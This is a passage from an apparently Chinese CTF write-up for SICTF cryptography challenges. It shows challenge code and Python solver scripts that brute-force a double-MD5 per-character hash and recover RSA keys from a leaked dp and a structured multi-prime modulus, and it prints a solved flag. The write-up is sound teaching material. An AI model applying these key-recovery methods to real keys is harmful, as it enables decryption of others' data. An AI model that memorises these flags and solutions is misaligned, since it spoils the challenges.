<span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><h4 id="hashgame"><a href="#hashgame" class="headerlink" title="hashgame"></a>hashgame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(md5(<span class="hljs-built_in">str</span>(md5(i.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest())<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">999a215b1f8372bb0f1c84c467a1506b</span><br><span class="hljs-string">02b0b94ee1fa195ae7959560893f7e3c</span><br><span class="hljs-string">297e7ca127d2eef674c119331fe30dff</span><br><span class="hljs-string">65c162f7c43612ba1bdf4d0f2912bbc0</span><br><span class="hljs-string">ed8a4ab0c0967b14e3bf6b145e153ec9</span><br><span class="hljs-string">d24412e1ab190533176a653cef11b185</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">cd7fd1517e323f26c6f1b0b6b96e3b3d</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">d7afde3e7059cd0a0fe09eec4b0008cd</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">ed108f6919ebadc8e809f8b86ef40b05</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dcfcd07e645d245babe887e5e2daa016</span><br><span class="hljs-string">665f644e43731ff9db3d341da5c827e1</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">5eccf232f5ebb3e780543372692fff18</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对flag先MD5加密为32位一个字符串，然后再对这个字符串的每一个字符MD5，改一下脚本爆破一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>a=<span class="hljs-string">&#x27;&#x27;</span><br>enc=[<span class="hljs-string">&#x27;999a215b1f8372bb0f1c84c467a1506b&#x27;</span>, <span class="hljs-string">&#x27;02b0b94ee1fa195ae7959560893f7e3c&#x27;</span>, <span class="hljs-string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>, <span class="hljs-string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>, <span class="hljs-string">&#x27;ed8a4ab0c0967b14e3bf6b145e153ec9&#x27;</span>, <span class="hljs-string">&#x27;d24412e1ab190533176a653cef11b185&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;cd7fd1517e323f26c6f1b0b6b96e3b3d&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dcfcd07e645d245babe887e5e2daa016&#x27;</span>, <span class="hljs-string">&#x27;665f644e43731ff9db3d341da5c827e1&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;5eccf232f5ebb3e780543372692fff18&#x27;</span>]<br><br>dic = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_&#125;&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>      des=md5(<span class="hljs-built_in">str</span>(md5(k.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<br>      <span class="hljs-keyword">if</span> des==enc[i]:<br>         a=a+k<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#SICTF&#123;837eb83b-14ad-413b-9f58-15ce02fdd9b4&#125;</span><br></code></pre></td></tr></table></figure><h4 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br>import libnum<br><span class="hljs-keyword">from</span> secret import flag,hint,alpha<br><br>def <span class="hljs-title function_ invoke__">gen_num</span>(x):<br>    <span class="hljs-keyword">while</span> True:<br>        x+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">isPrime</span>(x):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> x<br><br>p = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>q = <span class="hljs-title function_ invoke__">gen_num</span>(p*alpha)<br>r = <span class="hljs-title function_ invoke__">gen_num</span>(q*alpha*<span class="hljs-number">2</span>)<br>s = <span class="hljs-title function_ invoke__">gen_num</span>(r*alpha*<span class="hljs-number">4</span>)<br>n = p**alpha * q**(alpha*<span class="hljs-number">2</span>) * r**(alpha*<span class="hljs-number">4</span>) * s**<span class="hljs-number">2</span><br>e = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">2048</span>)<br>c = <span class="hljs-title function_ invoke__">pow</span>(libnum.<span class="hljs-title function_ invoke__">s2n</span>(flag), e, n)<br><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br>n = <span class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number"></span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br><span class="hljs-comment">#************************************hint**************************************</span><br>M = libnum.<span class="hljs-title function_ invoke__">s2n</span>(hint)<br>P = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>Q = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>N = P * Q<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;N=&quot;</span> , N)<br>E = <span class="hljs-number">65537</span><br>dp = (gmpy2.<span class="hljs-title function_ invoke__">invert</span>(E,(P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)))%(P-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;dp=&quot;</span> , dp)<br>ct = <span class="hljs-title function_ invoke__">pow</span>(M, E, N)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ct=&quot;</span> , ct)<br><span class="hljs-comment">#N= 154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br><span class="hljs-comment">#dp= 414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><span class="hljs-comment">#ct= 107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br></code></pre></td></tr></table></figure><p>hint是dp泄露，先跑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">import libnum<br><br>n= <span class="hljs-number">154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br>e= <span class="hljs-number">65537</span><br>c= <span class="hljs-number">107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br>dp= <span class="hljs-number">414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><br>p=gmpy2.<span class="hljs-title function_ invoke__">gcd</span>(<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>,e*dp,n)-<span class="hljs-number">2</span>,n)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, e):<br>    p = (dp * e - <span class="hljs-number">1</span>) <span class="hljs-comment">// i + 1</span><br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        q = n <span class="hljs-comment">// p</span><br>        <span class="hljs-keyword">break</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e, phi_n)<br>m = <span class="hljs-title function_ invoke__">pow</span>(c, d, n)<br>flag = libnum.<span class="hljs-title function_ invoke__">n2s</span>(<span class="hljs-keyword">int</span>(m))<br><span class="hljs-keyword">print</span>(flag)<br><span class="hljs-comment">#Alpha == 8</span><br></code></pre></td></tr></table></figure><blockquote><p>代入计算， n约等于 (8<strong>16)*(128</strong>32)*(4096**2)*p**58，只有一个未知数p，解方程可以得到一个在p附近的数，在这个数的前后爆破一下即可得到p。p的长度为512bit大于flag的长度，所以RSA模p</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> sympy import *<br>n = <span class="hljs-number">5105985403789700074683463229898791907804753568327091895288746957305314681237470913188309664401386157364208913921580975337310411501626906624714836197651718750537765265469236865451620881723264342803695458870800986916616188884984512161225777034626561478454762608029899362759274681436184570148751245407733804729424890377611793035616501895452901904217863185330739094247355178846089677259191282003585351138297534536012976127829218313057219988582314173741677461542065614750030228017321021706741600438665792340969457532553096045846638232739903921978582730293616691850720494225971325791367840278229683879072163661509994384144983328906745649208003820055828914910493659787337973564155184353434958210393142283887693566386370995729988120623557748489594461257014629506558063320027645359512824498621400625744180312137885340965019852002846158652489748075256048931472986114022522961598285002660982829096072183959578053576679236534098282758044064661853334914860739203842985573329397016114886552788122826521435138351046740097674799272410526624035789671826733382969675735032877477784015792671268989377249712269168368622384129232091557923825342048960505488240286582376402519643669617279991786466139079346166557379023295684206828087505465717863740236142551351104824196274911575024178645638325438120830267536736876648549108776863337666436940315645167229836691997047882916567572719150913999771896633290542029971469786319914679233881199894739415724761629909019600119688922726768277712560086564502961838844912517521114245314491981182921797984904404932236539501029158894011162515918859097908690730187746742468461645369106330159029649119071870852432400325409388419613458355173681300425013823279262890173839819087297341291933020491557934369885105177017657336055691356432084479526623527784821377132395928969971023662302791534564552325193015342223409016711382395398452401518786103633906834596634719546238686593243040775876110841883411213039188764920435788830597386152104394393683384606315742554178226278155236019235376265766770040850178758609288027621764778152848409369511421765327685177286365622562406684095251848861428018028254514654409934570227710779570942289575921223196822162945093382627398721634829725089917025252893611059715746591261272962332479055054965256838177113667047466170277448894139046848675770816671371876238253494102293894841996087398642210359852776813073899398484057902944738786220922008377531611016955399475146147276999522001145443620518739385055914692404653790913778372975613232973935181525245139482944757707748725966013455264695904860373867679648126316182245272338508189093460074497567797073196099151276188285519106814216473071803996328572488676558368949681344576229879547816856648339517749813839140134207246376767879074984906198654887065424221413387549334761903136535307398220297002178575342434736805851502635239478915013414413719654358514796708822029929559352799336523563362702515913246238980949841191907527752360050574052579450380313828675118221731220013095057285265968939264452917120351175536375891902928160017705541298403268328887075419994547916537426478796945853291126973821514479236917708093278076653760141145526262852892918080328455449053563804972276227387463076856111404838751778395119229776570456803537236727924116614892421626462721056499703591342774999072079061495732999900338589432158019541264486934601027754182252932554027581594319438118723736820531609448877753754659714323209645549473773185545182758543030994209999926909909168017571848538474743796211779769266819773719221917220851649104300321773209543419869845235945831724706097439702458109698585126325979437216281657243294475168231593877342202825101859597682396300171621150727584191770565717810751483748227218996837204883560410962485638805477527102891515126070870383106492356106882550591824679643795441340707666468638157755760491063379553451500551518130285346900667711041884182964400673033554172108294409788585993064873616267239328836754047053196498776312894655475972259089344203048670483416983089404363773755889054635491995688007881303246530743988910972239583927035151809584667713955665679236304408819867811200627693279931371517831898115707143912641550608407310294665934058537218339713038218041043828006736317867297447791653714332112673610248965760315569797710076932151985472965822351675821064197795806932252116952154065400254681412352411683875279018517749938670557406928359311153126595007137016529058023579519932909790991701591670091065340012268595338360828012299973379669725791865487711690996466561728824240894512730212938210261732106650957828027098749466419621155258413253003185246653865114216628604906208195613381106237748423403800689224156091373584488991265532798949506048718892085798867789991744055821605764795543242088760820339120317370862481218993037307814981565972498039271422354446444813880644861554319120036410956749499034041768108663075715313896377941478710129041346535693884936524414327590923367522289397641103970298313878039433948115583861228395681589284610075782599687657270925770065882648679604864720144937746640814071867213518528835271457905752422856646593039488422287665542439666913964923911525818300221338144541962599686557353617759147053322588929546142722444525184492604893485044492044614189717680113843402732912320941765722328370386704678538976658778514349925574290175042293377784700808934494234054916075876354383314765729962014826335872714790019157681823368134174601452729107804200627730572893521270586060484283151856245545511721521063544452405903801407563552263768294430681906723297768321121733220111378625905487216760593983796949945227944747745345795461096776152576967039504973328242995760691963302716664597584305420519690936808467656616854895564798250155054605855773883000050302405144486177152766008742906644168881845571425422070298270163626869248837043978741294122679494167334920808433155199129430480418806654426645349803706890812669084970510772371882217520590589128356176356910618044810359083177652799372175914326328326788064303813253400008989586804686941829931892080394597123914924101233868843405046482968159169802642402298595748831550407933884396992453140105360143111347265795959322013512647542111139845949741235752790854206543423477924462733593976557833498502678959607130203614591049308114986666222162995797749391593800459588118919963661901546249890400014552523201595168221161333410101571655997276353333484566883071699808047608762072467831165889525298773735147685450074189683078857699601680509969620668032642603757074663696274580245139737712070188649836984070166630191063540231647592508460734143414389633947194565009983249001546521184202070576688061203301817008452961175322350123721350505533970461744014493230313093447666288886757041097153290466920021060764055535284138664028625655434439072598250335151018414857903881068689727247549882297717797155695162954195560552344768685585774428873064826059450538296665439464522552903210241389489990886112332267341970913259152232961337516260313781971318755336313586122150531499346086727291944468834767062670664750088368649366708083202394660559350889292792521291280097042333526645235358200929889507930509072656770927931044260942122095048974033594063250458522283543505094530130154878152301293800797131136323638814969741855477661156245800996247228976922977604950949131781206924676667076786470811806563451510159953383909866744049818316493538336073057388234367442976283827978109520284460460162336128737167893836757798201862482504860006722696303442693476520277890340230808597902387726765047230290789032187231142495021575017759361105524130226585868338695622155062062047124475886323985504977086402296149566522634494605989928113933340423958049312409404166291783354